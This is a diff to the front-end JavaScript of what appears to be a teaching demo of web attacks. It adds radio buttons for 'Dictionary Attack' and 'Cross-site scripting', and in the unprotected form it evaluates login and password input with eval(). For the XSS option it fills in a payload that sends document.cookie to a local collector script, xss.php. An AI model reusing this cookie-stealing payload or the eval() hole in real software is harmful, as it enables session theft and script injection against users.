@@ -51,13 +51,13 @@
 	                    <div id="radio-group" style="border: 4px solid red; padding: 0 10px 0 10px; margin: 10px 0 10px 0;">
 	                    	<h3 style="text-align:center;">Select your attack</h3>
 	                    	<div class="radio">
-							    <label><input type="radio" name="optradio">Dictionary Attack</label>
+							    <label><input type="radio" id="rb-dictionary" name="attack" value="dict-attack">Dictionary Attack</label>
 							</div>
 							<div class="radio">
-							    <label><input type="radio" name="optradio">Cross-site scripting</label>
+							    <label><input type="radio" id="rb-xss" name="attack" value="xss-attack">Cross-site scripting</label>
 							</div>
 							<div class="radio">
-							    <label><input type="radio" name="optradio">None</label>
+							    <label><input type="radio" id="rb-none" name="attack" value="no-attack">None</label>
 							</div>
 	                    </div>
 
@@ -154,42 +154,74 @@
 
         <script>
         $(document).ready(function(){
+
+        	/* XSS Attack - Put malicious JS in login input */
+            $('input[type=radio][name=attack]').change(function() {
+		        if (this.value == 'xss-attack') {
+                	$("#loginWithoutSecurity").val("window.open(\"http://127.0.0.1/securitytesting/xssattack/xss.php?c=\"+document.cookie);");
+		        }
+		    });
 			
 			/* Handle the event when the form with security is submitted */
             $("#submitWithoutSecurity").click(function(){
-				var login = $("#loginWithoutSecurity").val();
-				var pass = $("#passwordWithoutSecurity").val();
 
-				try {
-					eval(login);
-				} catch (err) {
-					console.log("message : " + err + " and is not a javascript function");
-				}
+            	if($("#rb-dictionary").is(":checked")){
+            		var login = $("#loginWithoutSecurity").val();
+					var dataString = 'login='+ login;
+					if(login == '')
+					{
+						$("#displayWithoutSecurity").html("<h3 style=\"text-align:center;\">Need a login at least</h3>");
+					}
+					else
+					{
+						$.ajax({
+							type: "POST",
+							url: "dictionaryattack/dictionary.php",
+							data: dataString,
+							cache: false,
+							success: function(result){
+								$("#displayWithoutSecurity").html(result);
+							}
+						});
+					}
+					return false;
+            	} else {
+            		var login = $("#loginWithoutSecurity").val();
+					var pass = $("#passwordWithoutSecurity").val();
 
-				try {
-					eval(pass);
-				} catch (err) {
-					console.log("message : " + err + " and is not a javascript function");
-				}
-
-				var dataString = 'login='+ login + '&pass='+ pass;
-				if(login == '' || pass == '')
-				{
-					$("#displayWithoutSecurity").html("<h4 class=\"bg-warning\" style=\"text-align:center; padding: 30px 0 30px 0;\">Please fill all fields</h4>");
-				}
-				else
-				{
-					$.ajax({
-						type: "POST",
-						url: "processorWithoutSecurity.php",
-						data: dataString,
-						cache: false,
-						success: function(result){
-							$("#displayWithoutSecurity").html(result);
+					if($("#rb-xss").is(":checked")){
+						try {
+							eval(login);
+						} catch (err) {
+							console.log("message : " + err + " and is not a javascript function");
 						}
-					});
-				}
-				return false;
+
+						try {
+							eval(pass);
+						} catch (err) {
+							console.log("message : " + err + " and is not a javascript function");
+						}
+					}
+					
+					var dataString = 'login='+ login + '&pass='+ pass;
+					if(login == '' || pass == '')
+					{
+						$("#displayWithoutSecurity").html("<h4 class=\"bg-warning\" style=\"text-align:center; padding: 30px 0 30px 0;\">Please fill all fields</h4>");
+					}
+					else
+					{
+						$.ajax({
+							type: "POST",
+							url: "processorWithoutSecurity.php",
+							data: dataString,
+							cache: false,
+							success: function(result){
+								$("#displayWithoutSecurity").html(result);
+							}
+						});
+					}
+					return false;
+            	}				
             });
 			
 			$("#submitWithSecurity").click(function(){
@@ -244,7 +276,7 @@
 			});
 
 			/* Handle the dictionary attack */
-			$('#submitDictionaryAttack').click(function(){
+			/*$('#submitDictionaryAttack').click(function(){
 				var login = $("#loginWithoutSecurity").val();
 				var dataString = 'login='+ login;
 				if(login == '')
@@ -264,7 +296,7 @@
 					});
 				}
 				return false;
-			});
+			});*/
 
 			/* clear everything */
 			$('#clear').click(function(){
